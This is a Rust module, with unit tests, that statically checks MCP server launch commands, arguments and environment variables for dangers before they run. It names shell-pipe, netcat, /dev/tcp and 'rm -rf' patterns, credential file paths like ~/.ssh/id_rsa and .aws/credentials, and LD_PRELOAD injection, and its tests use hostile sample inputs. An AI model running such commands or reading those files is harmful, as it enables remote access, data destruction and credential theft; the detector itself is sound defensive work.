use crate::{Finding, FindingType, McpServerConfig, Severity};
use regex::Regex;
use std::sync::OnceLock;

/// Verdict from pre-execution static analysis of a server command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CommandVerdict {
    /// Known safe launcher, no findings.
    Safe,
    /// No critical issues but minor advisories present (or unknown command with no findings).
    SafeWithAdvisory,
    /// High-severity findings present — execution not recommended.
    Suspicious,
    /// Critical findings — must not execute.
    Unsafe,
}

/// Result of analyzing an MCP server's command configuration.
#[derive(Debug, Clone)]
pub struct CommandAnalysisResult {
    pub server_name: String,
    pub findings: Vec<Finding>,
    pub verdict: CommandVerdict,
}

/// Known safe launcher commands that are expected to run packages.
const SAFE_LAUNCHERS: &[&str] = &[
    "npx", "node", "python", "python3", "uvx", "uv", "docker", "deno", "bun", "bunx", "pipx",
    "cargo",
];

/// Shell interpreters that should not be used as bare MCP commands.
const DANGEROUS_COMMANDS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "fish",
    "csh",
    "tcsh",
    "ksh",
    "cmd",
    "cmd.exe",
    "powershell",
    "powershell.exe",
    "pwsh",
    "pwsh.exe",
];

/// Critical patterns in joined args string.
static CRITICAL_ARG_PATTERNS: OnceLock<Vec<Regex>> = OnceLock::new();
/// High-severity patterns in joined args string.
static HIGH_ARG_PATTERNS: OnceLock<Vec<Regex>> = OnceLock::new();

/// Sensitive file paths that should not appear in args.
const SENSITIVE_PATHS: &[&str] = &[
    "~/.ssh",
    ".ssh/",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    "id_dsa",
    "~/.aws",
    ".aws/credentials",
    ".aws/config",
    "/etc/shadow",
    "/etc/passwd",
    "~/.git-credentials",
    ".git-credentials",
    "~/.netrc",
    ".netrc",
    "~/.gnupg",
    ".gnupg/",
    "~/.kube/config",
];

/// Critical env vars that can hijack process execution.
const CRITICAL_ENV_VARS: &[&str] = &["LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "BASH_ENV"];

/// High-severity env vars.
const HIGH_ENV_VARS: &[&str] = &[
    "NODE_OPTIONS",
    "PYTHONSTARTUP",
    "PROMPT_COMMAND",
    "LD_LIBRARY_PATH",
];

/// Medium-severity env vars (library path injection).
const MEDIUM_ENV_VARS: &[&str] = &["PYTHONPATH", "NODE_PATH", "RUBYLIB", "PERL5LIB"];

fn critical_arg_patterns() -> &'static Vec<Regex> {
    CRITICAL_ARG_PATTERNS.get_or_init(|| {
        vec![
            Regex::new(r"(?i)\|\s*(ba)?sh\b").expect("valid regex"),
            Regex::new(r"(?i)\beval\s").expect("valid regex"),
            Regex::new(r"(?i)>\s*/dev/tcp/").expect("valid regex"),
            Regex::new(r"(?i)\bnc\s").expect("valid regex"),
            Regex::new(r"(?i)\bnetcat\s").expect("valid regex"),
            Regex::new(r"(?i)\brm\s+-rf\b").expect("valid regex"),
            Regex::new(r"(?i)\bsudo\s").expect("valid regex"),
            Regex::new(r"(?i)\bchmod\s+\+s\b").expect("valid regex"),
        ]
    })
}

fn high_arg_patterns() -> &'static Vec<Regex> {
    HIGH_ARG_PATTERNS.get_or_init(|| {
        vec![
            Regex::new(r"(?i)\bcurl\s").expect("valid regex"),
            Regex::new(r"(?i)\bwget\s").expect("valid regex"),
            Regex::new(r"(?i)\bbash\s+-c\b").expect("valid regex"),
            Regex::new(r"(?i)\bsh\s+-c\b").expect("valid regex"),
            Regex::new(r"(?i)\bdd\s+if=").expect("valid regex"),
            Regex::new(r"(?i)\bpython\s+-c\b").expect("valid regex"),
            Regex::new(r"(?i)\bnode\s+-e\b").expect("valid regex"),
        ]
    })
}

/// Extract the basename from a potentially absolute path.
fn extract_basename(cmd: &str) -> &str {
    cmd.rsplit('/')
        .next()
        .unwrap_or(cmd)
        .rsplit('\\')
        .next()
        .unwrap_or(cmd)
}

/// Check if a command basename is a known safe launcher.
fn is_safe_launcher(basename: &str) -> bool {
    SAFE_LAUNCHERS
        .iter()
        .any(|s| basename.eq_ignore_ascii_case(s))
}

/// Check if a command basename is a dangerous shell interpreter.
fn is_dangerous_command(basename: &str) -> bool {
    DANGEROUS_COMMANDS
        .iter()
        .any(|s| basename.eq_ignore_ascii_case(s))
}

/// Analyze an MCP server's command, args, and env for security issues
/// before execution.
pub fn analyze_command(server: &McpServerConfig) -> CommandAnalysisResult {
    let mut findings = Vec::new();

    // If there's no command (URL-only or empty config), it's safe
    let command = match server.command.as_deref() {
        Some(cmd) if !cmd.is_empty() => cmd,
        _ => {
            return CommandAnalysisResult {
                server_name: server.name.clone(),
                findings,
                verdict: CommandVerdict::Safe,
            };
        }
    };

    let basename = extract_basename(command);

    // Layer 1: Check if the base command itself is a shell interpreter
    if is_dangerous_command(basename) {
        findings.push(Finding {
            severity: Severity::Critical,
            finding_type: FindingType::DangerousCommand,
            tool_name: server.name.clone(),
            field: "command".into(),
            detail: format!(
                "MCP server uses shell interpreter '{basename}' as command — \
                 arbitrary code execution risk"
            ),
            matched_text: command.to_string(),
        });
    }

    let is_safe = is_safe_launcher(basename);

    // Layer 2: Check args for dangerous patterns
    let joined_args = server.args.join(" ");

    for pattern in critical_arg_patterns() {
        if pattern.is_match(&joined_args) {
            findings.push(Finding {
                severity: Severity::Critical,
                finding_type: FindingType::DangerousCommand,
                tool_name: server.name.clone(),
                field: "args".into(),
                detail: format!("Dangerous pattern in args: {}", pattern.as_str()),
                matched_text: joined_args.clone(),
            });
        }
    }

    for pattern in high_arg_patterns() {
        if pattern.is_match(&joined_args) {
            findings.push(Finding {
                severity: Severity::High,
                finding_type: FindingType::DangerousCommand,
                tool_name: server.name.clone(),
                field: "args".into(),
                detail: format!("Suspicious pattern in args: {}", pattern.as_str()),
                matched_text: joined_args.clone(),
            });
        }
    }

    // Layer 3: Check for sensitive file paths in args
    let joined_args_lower = joined_args.to_lowercase();
    for path in SENSITIVE_PATHS {
        if joined_args_lower.contains(&path.to_lowercase()) {
            findings.push(Finding {
                severity: Severity::High,
                finding_type: FindingType::DangerousCommand,
                tool_name: server.name.clone(),
                field: "args".into(),
                detail: format!("Sensitive file path '{path}' referenced in args"),
                matched_text: joined_args.clone(),
            });
        }
    }

    // Layer 4: Check env vars
    for (key, _value) in &server.env {
        let key_upper = key.to_uppercase();

        if CRITICAL_ENV_VARS.iter().any(|v| key_upper == *v) {
            findings.push(Finding {
                severity: Severity::Critical,
                finding_type: FindingType::DangerousCommand,
                tool_name: server.name.clone(),
                field: "env".into(),
                detail: format!("Critical env var '{key}' set — can hijack process execution"),
                matched_text: key.clone(),
            });
        } else if HIGH_ENV_VARS.iter().any(|v| key_upper == *v) {
            let mut sev = Severity::High;
            // NODE_OPTIONS with --require or --loader is especially dangerous
            if key_upper == "NODE_OPTIONS" {
                let val_lower = _value.to_lowercase();
                if val_lower.contains("--require") || val_lower.contains("--loader") {
                    findings.push(Finding {
                        severity: Severity::Critical,
                        finding_type: FindingType::DangerousCommand,
                        tool_name: server.name.clone(),
                        field: "env".into(),
                        detail: "NODE_OPTIONS contains --require/--loader — \
                             arbitrary code injection"
                            .to_string(),
                        matched_text: format!("{key}={_value}"),
                    });
                    continue;
                }
                sev = Severity::High;
            }
            findings.push(Finding {
                severity: sev,
                finding_type: FindingType::DangerousCommand,
                tool_name: server.name.clone(),
                field: "env".into(),
                detail: format!("Suspicious env var '{key}' set"),
                matched_text: key.clone(),
            });
        } else if MEDIUM_ENV_VARS.iter().any(|v| key_upper == *v) {
            findings.push(Finding {
                severity: Severity::Medium,
                finding_type: FindingType::DangerousCommand,
                tool_name: server.name.clone(),
                field: "env".into(),
                detail: format!("Library path env var '{key}' set — may alter module resolution"),
                matched_text: key.clone(),
            });
        }
    }

    // Layer 5: Package specifier check (for safe launchers)
    if is_safe {
        check_package_specifier(server, &mut findings);
    }

    // Compute verdict
    let verdict = compute_verdict(&findings, is_safe);

    CommandAnalysisResult {
        server_name: server.name.clone(),
        findings,
        verdict,
    }
}

/// For safe launchers, check if the package specifier looks suspicious.
fn check_package_specifier(server: &McpServerConfig, findings: &mut Vec<Finding>) {
    // Skip flags like -y, --yes, -g, --global to find the actual package name
    let skip_flags: &[&str] = &["-y", "--yes", "-g", "--global", "--"];
    let package = server
        .args
        .iter()
        .find(|arg| !arg.starts_with('-') && !skip_flags.contains(&arg.as_str()));

    if let Some(pkg) = package {
        if pkg.contains("..") {
            findings.push(Finding {
                severity: Severity::High,
                finding_type: FindingType::DangerousCommand,
                tool_name: server.name.clone(),
                field: "args".into(),
                detail: format!("Package specifier contains path traversal '..': {pkg}"),
                matched_text: pkg.clone(),
            });
        }
        if pkg.contains("://") && !pkg.starts_with("npm:") && !pkg.starts_with("jsr:") {
            findings.push(Finding {
                severity: Severity::High,
                finding_type: FindingType::DangerousCommand,
                tool_name: server.name.clone(),
                field: "args".into(),
                detail: format!("Package specifier contains URL scheme: {pkg}"),
                matched_text: pkg.clone(),
            });
        }
    }
}

/// Determine the verdict from findings.
fn compute_verdict(findings: &[Finding], is_known_safe_launcher: bool) -> CommandVerdict {
    let has_critical = findings.iter().any(|f| f.severity == Severity::Critical);
    let has_high = findings.iter().any(|f| f.severity == Severity::High);
    let has_medium = findings.iter().any(|f| f.severity == Severity::Medium);

    if has_critical {
        CommandVerdict::Unsafe
    } else if has_high {
        CommandVerdict::Suspicious
    } else if has_medium {
        CommandVerdict::SafeWithAdvisory
    } else if is_known_safe_launcher {
        CommandVerdict::Safe
    } else {
        // Unknown command with no findings
        CommandVerdict::SafeWithAdvisory
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{AgentType, ConfigScope, McpConfigLocation};
    use std::collections::HashMap;
    use std::path::PathBuf;

    fn make_server(
        name: &str,
        command: Option<&str>,
        args: Vec<&str>,
        env: HashMap<String, String>,
    ) -> McpServerConfig {
        McpServerConfig {
            name: name.to_string(),
            command: command.map(String::from),
            args: args.into_iter().map(String::from).collect(),
            env,
            url: None,
            source: McpConfigLocation {
                agent: AgentType::ClaudeCode,
                path: PathBuf::from("/test"),
                scope: ConfigScope::Project,
            },
        }
    }

    #[test]
    fn test_npx_safe_package() {
        let server = make_server(
            "filesystem",
            Some("npx"),
            vec!["-y", "@anthropic/mcp-filesystem"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Safe);
        assert!(result.findings.is_empty());
    }

    #[test]
    fn test_python_safe_module() {
        let server = make_server(
            "pyserver",
            Some("python3"),
            vec!["-m", "mcp_server"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Safe);
        assert!(result.findings.is_empty());
    }

    #[test]
    fn test_docker_run() {
        let server = make_server(
            "dockerized",
            Some("docker"),
            vec!["run", "--rm", "mcp-server:latest"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Safe);
    }

    #[test]
    fn test_absolute_path_safe_launcher() {
        let server = make_server(
            "abs-npx",
            Some("/usr/local/bin/npx"),
            vec!["-y", "@modelcontextprotocol/server-github"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Safe);
        assert!(result.findings.is_empty());
    }

    #[test]
    fn test_raw_bash_command() {
        let server = make_server(
            "danger-bash",
            Some("bash"),
            vec!["-c", "echo hello"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Unsafe);
        assert!(result
            .findings
            .iter()
            .any(|f| f.severity == Severity::Critical && f.field == "command"));
    }

    #[test]
    fn test_raw_sh_command() {
        let server = make_server(
            "danger-sh",
            Some("sh"),
            vec!["-c", "whoami"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Unsafe);
    }

    #[test]
    fn test_curl_pipe_bash_args() {
        let server = make_server("evil", Some("npx"), vec!["-y", "| bash"], HashMap::new());
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Unsafe);
        assert!(result
            .findings
            .iter()
            .any(|f| f.severity == Severity::Critical && f.detail.contains("Dangerous pattern")));
    }

    #[test]
    fn test_ld_preload_env() {
        let mut env = HashMap::new();
        env.insert("LD_PRELOAD".to_string(), "/tmp/evil.so".to_string());
        let server = make_server("preload", Some("npx"), vec!["-y", "safe-pkg"], env);
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Unsafe);
        assert!(result
            .findings
            .iter()
            .any(|f| f.severity == Severity::Critical && f.detail.contains("LD_PRELOAD")));
    }

    #[test]
    fn test_node_options_require() {
        let mut env = HashMap::new();
        env.insert(
            "NODE_OPTIONS".to_string(),
            "--require /tmp/inject.js".to_string(),
        );
        let server = make_server("inject", Some("npx"), vec!["-y", "safe-pkg"], env);
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Unsafe);
        assert!(result
            .findings
            .iter()
            .any(|f| f.severity == Severity::Critical && f.detail.contains("NODE_OPTIONS")));
    }

    #[test]
    fn test_benign_env_vars() {
        let mut env = HashMap::new();
        env.insert("GITHUB_TOKEN".to_string(), "ghp_xxx".to_string());
        env.insert("DEBUG".to_string(), "true".to_string());
        let server = make_server("benign", Some("npx"), vec!["-y", "safe-pkg"], env);
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Safe);
        assert!(result.findings.is_empty());
    }

    #[test]
    fn test_url_only_server() {
        let server = McpServerConfig {
            name: "http-server".to_string(),
            command: None,
            args: vec![],
            env: HashMap::new(),
            url: Some("http://localhost:3000".to_string()),
            source: McpConfigLocation {
                agent: AgentType::ClaudeCode,
                path: PathBuf::from("/test"),
                scope: ConfigScope::Project,
            },
        };
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Safe);
        assert!(result.findings.is_empty());
    }

    #[test]
    fn test_no_command_no_url() {
        let server = make_server("empty", None, vec![], HashMap::new());
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Safe);
        assert!(result.findings.is_empty());
    }

    #[test]
    fn test_sensitive_path_in_args() {
        let server = make_server(
            "ssh-reader",
            Some("npx"),
            vec!["-y", "pkg", "--path", "~/.ssh/id_rsa"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        assert!(!result.findings.is_empty());
        assert!(result
            .findings
            .iter()
            .any(|f| f.detail.contains("Sensitive file path")));
    }

    #[test]
    fn test_unknown_command_no_findings() {
        let server = make_server(
            "custom",
            Some("/opt/my-mcp-server"),
            vec!["--port", "3000"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        // Unknown command with no dangerous patterns → SafeWithAdvisory
        assert_eq!(result.verdict, CommandVerdict::SafeWithAdvisory);
        assert!(result.findings.is_empty());
    }

    #[test]
    fn test_package_with_path_traversal() {
        let server = make_server(
            "traversal",
            Some("npx"),
            vec!["-y", "../../../evil-pkg"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        assert!(result
            .findings
            .iter()
            .any(|f| f.detail.contains("path traversal")));
    }

    #[test]
    fn test_package_with_url_scheme() {
        let server = make_server(
            "url-pkg",
            Some("npx"),
            vec!["-y", "https://evil.com/pkg.tgz"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        assert!(result
            .findings
            .iter()
            .any(|f| f.detail.contains("URL scheme")));
    }

    #[test]
    fn test_medium_env_pythonpath() {
        let mut env = HashMap::new();
        env.insert("PYTHONPATH".to_string(), "/tmp/evil".to_string());
        let server = make_server("pypath", Some("python3"), vec!["-m", "server"], env);
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::SafeWithAdvisory);
        assert!(result
            .findings
            .iter()
            .any(|f| f.severity == Severity::Medium && f.detail.contains("PYTHONPATH")));
    }

    #[test]
    fn test_rm_rf_in_args() {
        let server = make_server(
            "destroyer",
            Some("npx"),
            vec!["-y", "pkg", "rm -rf /"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Unsafe);
    }

    #[test]
    fn test_sudo_in_args() {
        let server = make_server(
            "escalation",
            Some("npx"),
            vec!["-y", "pkg", "sudo install"],
            HashMap::new(),
        );
        let result = analyze_command(&server);
        assert_eq!(result.verdict, CommandVerdict::Unsafe);
    }
}
